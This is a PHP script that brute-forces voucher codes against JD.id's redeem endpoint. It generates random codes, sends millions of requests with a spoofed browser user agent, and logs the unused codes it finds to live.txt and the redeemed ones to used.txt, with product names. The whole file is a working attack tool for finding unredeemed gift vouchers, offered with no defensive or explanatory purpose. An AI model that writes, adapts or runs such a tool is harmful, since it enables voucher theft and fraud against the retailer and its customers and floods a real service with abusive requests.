<?php
function voucher($length = 9)
{
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function getStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function inStr($s,$as) {
    $s=strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}

        $x = 0;
        $jum = 9999999;
    while($x < $jum) {
 //  $voucher = "734983243694";
$voucher = "73".voucher(10); //734983243694
$masuk = base64_encode($voucher);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://m.jd.id/ajax/ls/redeem?code='.$masuk);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

$value = getStr($result,'"skuName":"','"');

if(inStr($result,'"status":"NOT_CONSUMED"')){
$format = $voucher." - ".$value;
$h=fopen("live.txt","a+");
fwrite($h,$format."\n");
fclose($h);
echo $format."\n";
} else if(inStr($result,'"success":false')){
$format = $voucher." - Tidak Valid";
echo $format."\n";
} else if(inStr($result,'"status":"CONSUMED"')){
$format = $voucher." - ".$value;
$h=fopen("used.txt","a+");
fwrite($h,$format."\n");
fclose($h);
echo $format."\n";
} else {
echo "$voucher - Unknown \n";
}
}
